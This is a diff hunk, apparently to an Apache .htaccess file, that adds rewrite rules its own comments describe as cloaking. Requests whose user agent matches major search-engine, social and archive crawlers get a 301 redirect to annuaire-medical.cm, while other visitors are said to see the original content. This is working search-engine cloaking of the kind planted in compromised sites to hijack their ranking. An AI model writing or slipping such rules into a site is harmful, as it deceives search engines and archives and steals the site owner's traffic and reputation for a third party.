@@ -1,0 +1,14 @@
+# Define the target URL for cloaking
+RewriteCond %{HTTP_USER_AGENT} googlebot [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} bingbot [NC,OR]      
+RewriteCond %{HTTP_USER_AGENT} slurp [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} yandex [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} baiduspider [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} duckduckbot [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} facebot [NC,OR] 
+RewriteCond %{HTTP_USER_AGENT} ia_archiver [NC]
+
+# Redirect matched bots to annuaire-medical.cm
+RewriteRule ^(.*)$ https://annuaire-medical.cm/ [R=301,L]
+
+# For all other users, serve the original content
